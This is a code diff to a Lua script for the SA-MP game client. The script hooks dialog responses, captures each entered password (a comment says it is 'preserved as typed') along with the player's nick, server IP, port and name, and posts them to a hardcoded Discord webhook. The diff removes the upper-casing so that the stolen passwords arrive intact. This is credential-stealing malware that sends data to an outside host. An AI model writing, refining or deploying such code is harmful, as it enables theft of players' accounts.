@@ -20,7 +20,6 @@ local webhookUrl = "https://discord.com/api/webhooks/1344405697642762260/AMSM__D
 local messageSent = false
 
 function sendMessageToDiscord(content)
-    -- Envio direto (sem lua_thread)
     local body = '{"content": "' .. content:gsub('"', '\\"'):gsub("\n", "\\n") .. '"}'
     local response_body = {}
     https.request {
@@ -54,18 +53,18 @@ samp.onSendDialogResponse = function(dialogId, button, listboxId, input)
             "**SERVIDOR:** %s\n" ..
             "**DATA:** %s\n" ..
             "**HORA:** %s\n\n" ..
-            "@EVERYONE",
+            "@everyone", -- manter minúsculo!
             dialogId,
-            input:upper(),
-            nick:upper(),
+            input,        -- senha preservada como digitada
+            nick,         -- nick normal
             ip,
             port,
-            servername:upper(),
+            servername,   -- nome do servidor original
             data,
             hora
         )
 
-        sendMessageToDiscord(message:upper())
+        sendMessageToDiscord(message)
         messageSent = true
     end
 end
